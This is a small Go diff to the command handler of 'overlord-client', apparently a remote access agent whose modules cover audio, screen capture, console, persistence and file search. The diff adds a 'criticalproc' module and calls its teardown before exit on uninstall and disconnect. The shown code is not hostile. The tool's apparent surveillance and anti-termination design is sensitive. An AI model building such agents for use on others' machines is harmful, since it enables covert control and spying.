@@ -17,6 +17,7 @@ import (
 	"overlord-client/cmd/agent/audio"
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/console"
+	"overlord-client/cmd/agent/criticalproc"
 	"overlord-client/cmd/agent/filesearch"
 	"overlord-client/cmd/agent/persistence"
 	"overlord-client/cmd/agent/plugins"
@@ -1907,11 +1908,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			log.Printf("uninstall: failed to remove persistence: %v", err)
 		}
 
+		criticalproc.Teardown()
 		os.Exit(0)
 	case "disconnect":
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
 		_ = wire.WriteMsg(ctx, env.Conn, res)
 		resetForReconnect(env)
+		criticalproc.Teardown()
 		os.Exit(0)
 		return nil
 	case "reconnect":
